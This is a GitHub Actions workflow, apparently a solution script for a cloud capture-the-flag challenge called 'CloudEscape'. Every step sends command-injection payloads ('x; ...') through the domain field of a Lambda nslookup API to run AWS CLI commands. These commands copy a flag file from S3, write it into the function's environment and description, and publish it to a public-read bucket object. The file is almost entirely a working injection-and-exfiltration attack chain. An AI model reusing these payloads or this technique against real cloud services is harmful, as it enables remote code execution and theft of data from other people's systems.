name: CloudEscape Stage 1 - Env Exfil
on:
  workflow_dispatch:
  push:
    branches: [corgi]

permissions:
  id-token: write
  contents: read

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      # ── Step 1: Simple test - can the Lambda's aws CLI list buckets? ──
      # This writes to CloudWatch - we can't see it, but it confirms RCE
      - name: Test 1 - Confirm RCE with simple commands
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          echo "===== Simple echo test ====="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
            -d '{"domain": "x; echo RCE_CONFIRMED > /tmp/rce.txt"}' 2>&1
          sleep 2

      # ── Step 2: Copy flag to /tmp, then update Lambda env in separate call ──
      - name: Test 2 - Copy flag to /tmp
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          echo "===== Copy flag to /tmp ====="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
            -d '{"domain": "x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt"}' 2>&1
          sleep 3

      # ── Step 3: Use a Python one-liner to update Lambda env ──
      # The Lambda's timeout is 15s so we need fast commands
      - name: Test 3 - Update env var with flag content
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          echo "===== Update Lambda env with flag ====="
          # Try using the Lambda's own aws CLI to update its env
          # The flag is in /tmp/flag.txt from step 2
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
            -d '{"domain": "x; F=$(cat /tmp/flag.txt); aws lambda update-function-configuration --function-name nslookupv2 --environment Variables={FLAG=$F}"}' 2>&1
          sleep 8

      # ── Step 4: Read the env var ──
      - name: Test 4 - Read Lambda env
        run: |
          echo "===== Read Lambda config ====="
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 2>&1

      # ── Step 5: Try with a different approach - put flag in Lambda description ──
      - name: Test 5 - Put flag in Lambda description
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          echo "===== Update Lambda description with flag ====="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
            -d '{"domain": "x; F=$(cat /tmp/flag.txt); aws lambda update-function-configuration --function-name nslookupv2 --description $F"}' 2>&1
          sleep 8
          echo "===== Read description ====="
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Description' 2>&1

      # ── Step 6: Try using S3 copy with the Lambda's own creds to write to codec bucket ──
      - name: Test 6 - Write flag to codec bucket under new key
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          echo "===== Copy flag to new key in codec bucket ====="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
            -d '{"domain": "x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://codec4f26c862a321ef5/exfil.txt"}' 2>&1
          sleep 5
          echo "===== Try to read exfil.txt from codec bucket ====="
          aws s3 ls s3://codec4f26c862a321ef5/ --region us-east-1 2>&1

      # ── Step 7: Try writing flag to a public object via bucket ACL ──
      - name: Test 7 - Copy flag and set public ACL
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          echo "===== Copy flag to platform bucket with public-read ACL ====="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" \
            -d '{"domain": "x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/public_flag.txt --acl public-read"}' 2>&1
          sleep 5
          echo "===== Read public_flag.txt ====="
          curl -s "https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/public_flag.txt" 2>&1

      # ── Step 8: If env var update worked, read it now ──
      - name: Final env check
        run: |
          echo "===== Final Lambda config with env ====="
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 2>&1 | python3 -c "import sys,json; d=json.load(sys.stdin); print('ENV:', d.get('Environment',{}).get('Variables',{})); print('DESC:', d.get('Description',''))" 2>&1 || aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 2>&1